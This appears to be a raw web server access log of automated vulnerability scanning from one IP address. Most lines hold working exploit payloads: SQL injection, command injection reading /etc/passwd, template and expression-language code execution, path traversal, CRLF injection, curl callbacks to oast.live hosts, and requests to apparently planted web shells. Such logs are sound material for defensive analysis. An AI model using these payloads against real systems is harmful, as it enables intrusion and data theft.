"/CTCWebService/CTCWebServiceBean/ConfigServlet","-","148.135.107.254","POST"
"/fw.login.php","apikey=%2527UNION%2520select%25201,%2527YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%2527;","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/index.php/catalogsearch/advanced/result/","name=e","148.135.107.254","GET"
"/session/create","-","148.135.107.254","POST"
"/api/jsonws/invoke","-","148.135.107.254","POST"
"/cgi-bin/mainfunction.cgi","-","148.135.107.254","POST"
"/api/jsonws/invoke","-","148.135.107.254","POST"
"/upload","-","148.135.107.254","POST"
"/assets/php/upload.php","-","148.135.107.254","POST"
"/cgi-bin/libagent.cgi","type=J","148.135.107.254","POST"
"/index.php","app=main&inc=core_auth&route=login","148.135.107.254","GET"
"/","app=main&inc=core_auth&route=login","148.135.107.254","GET"
"/+CSCOE+/session_password.html","-","148.135.107.254","GET"
"/server/","-","148.135.107.254","GET"
"/wp-content/plugins/quiz-master-next/README.md","-","148.135.107.254","GET"
"/EemAdminService/EemAdmin","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/","author=1","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/ext-js/index.html","-","148.135.107.254","GET"
"/%2504%25D7%257F%25BF%2518%25D8%257F%25BF%2518%25D8%257F%25BFd%25B8%2506%2508;%257Bcurl,http://cl82amo80ssu2h3kcjs09gza5uwwttw8e.oast.live+-H+%2527User-Agent:+r0Ob9m%2527%257D;%2504%25D7%257F%25BF%2518%25D8%257F%25BF%2518%25D8%257F%25BFd%25B8%2506%2508;%257Bcurl,http://cl82amo80ssu2h3kcjs0s6unmdx89rhq1.oast.live+-H+%2527User-Agent:+r0Ob9m%2527%257D;","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/hsqldb%250a","-","148.135.107.254","GET"
"/lucee/admin/imgProcess.cfm","file=/whatever","148.135.107.254","POST"
"/apply_sec.cgi","-","148.135.107.254","POST"
"/lucee/admin/imgProcess.cfm","file=/../../../context/2Y3POXLhU3Ype6n61GFEPmnLeiG.cfm","148.135.107.254","POST"
"/ui/vropspluginui/rest/services/getstatus","-","148.135.107.254","GET"
"/logupload","logMetaData=%257B%2522itrLogPath%2522%253A%2520%2522..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fhttpd%252Fhtml%252Fwsgi_log_upload%2522%252C%2520%2522logFileType%2522%253A%2520%2522log_upload_wsgi.py%2522%252C%2520%2522workloadID%2522%253A%2520%25222%2522%257D","148.135.107.254","POST"
"/cgi-bin/weblogin.cgi","username=admin%27;cat+/etc/passwd","148.135.107.254","GET"
"/actions/seomatic/meta-container/meta-link-container/","uri=%7B%7B228*%2798%27%7D%7D","148.135.107.254","GET"
"/%2504%25D7%257F%25BF%2518%25D8%257F%25BF%2518%25D8%257F%25BF%2508%25B7%2506%2508;%257Bcurl,http://cl82amo80ssu2h3kcjs0mn8jo18zzw36e.oast.live+-H+%2527User-Agent:+r0Ob9m%2527%257D;%2504%25D7%257F%25BF%2518%25D8%257F%25BF%2518%25D8%257F%25BF%2508%25B7%2506%2508;%257Bcurl,http://cl82amo80ssu2h3kcjs0nribq97d8c6sp.oast.live+-H+%2527User-Agent:+r0Ob9m%2527%257D;","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","148.135.107.254","GET"
"/cgi-bin/mt/mt-xmlrpc.cgi","-","148.135.107.254","POST"
"/actions/seomatic/meta-container/all-meta-containers","uri=%7B%7B228*%2798%27%7D%7D","148.135.107.254","GET"
"/php/ping.php","hostname=%7Cdir","148.135.107.254","GET"
"/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData","-","148.135.107.254","POST"
"/AdminService/urest/v1/LogonResource","-","148.135.107.254","POST"
"/api/v1/method.callAnon/getPasswordPolicy","-","148.135.107.254","POST"
"/linuxki/experimental/vis/kivis.php","type=kitrace&pid=0;echo%2520START;cat%2520/etc/passwd;echo%2520END;","148.135.107.254","GET"
"/wp-content/plugins/quiz-master-next/tests/_support/AcceptanceTester.php","-","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php","-","148.135.107.254","GET"
"/wp-admin/admin.php","page=contest-gallery/index.php&users_management=true&option_id=1","148.135.107.254","POST"
"/wp-content/plugins/imagements/images/2y3pnmtakvl4cl8baockwhbqftv.php","-","148.135.107.254","GET"
"/wp-admin/index.php","-","148.135.107.254","GET"
"/storfs-asup","-","148.135.107.254","POST"
"/apply_sec.cgi","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/Schemas/$%257B%2527%2527.class.forName%2528%2527javax.script.ScriptEngineManager%2527%2529.newInstance%2528%2529.getEngineByName%2528%2527js%2527%2529.eval%2528%2527java.lang.Runtime.getRuntime%2528%2529.exec%2528%2522id%2522%2529%2527%2529%257D","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/wp-admin/admin-ajax.php","action=uploadFontIcon","148.135.107.254","POST"
"/mgmt/shared/authn/login","-","148.135.107.254","POST"
"/wp-content/plugins/wpcargo/includes/2Y3POP2JbJMtB8efEohjuZ6nitb.php","-","148.135.107.254","GET"
"/analytics/telemetry/ph/api/hyper/send","_c&_i=test","148.135.107.254","POST"
"/run","-","148.135.107.254","POST"
"/_ignition/execute-solution","-","148.135.107.254","POST"
"/wp-content/uploads/kaswara/fonts_icon/ohjtqg/am.php","-","148.135.107.254","GET"
"/test.txt%250d%250aSet-Cookie:CRLFInjection=Test%250d%250aLocation:%2520interact.sh%250d%250aX-XSS-Protection:0","-","148.135.107.254","GET"
"/wp-content/plugins/wpcargo/includes/2Y3POP2JbJMtB8efEohjuZ6nitb.php","1=var_dump","148.135.107.254","POST"
"/premise/front/getPingData","url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;","148.135.107.254","GET"
"/cgi-bin/cgiServer","worker=IndexNew","148.135.107.254","GET"
"/lucee/2Y3POXLhU3Ype6n61GFEPmnLeiG.cfm","-","148.135.107.254","POST"
"/wp-comments-post.php","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/wp-content/uploads/workreap-temp/2Y3POSPz1qllieScBGwiww8bBdo.php","-","148.135.107.254","GET"
"/webtools/control/SOAPService","-","148.135.107.254","POST"
"/assets/app/something/services/AppModule.class/","-","148.135.107.254","GET"
"/prweb/PRAuth/app/default/","-","148.135.107.254","GET"
"/wp-admin/admin-ajax.php","-","148.135.107.254","POST"
"/wp-content/plugins/wpcargo/includes/barcode.php","text=x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx&sizefactor=.090909090909&size=1&filepath=2Y3POP2JbJMtB8efEohjuZ6nitb.php","148.135.107.254","GET"
"/redfish/v1/SessionService/ResetPassword/1/","-","148.135.107.254","PATCH"
"/goform/setmac","-","148.135.107.254","POST"
"/users/sign_in","-","148.135.107.254","GET"
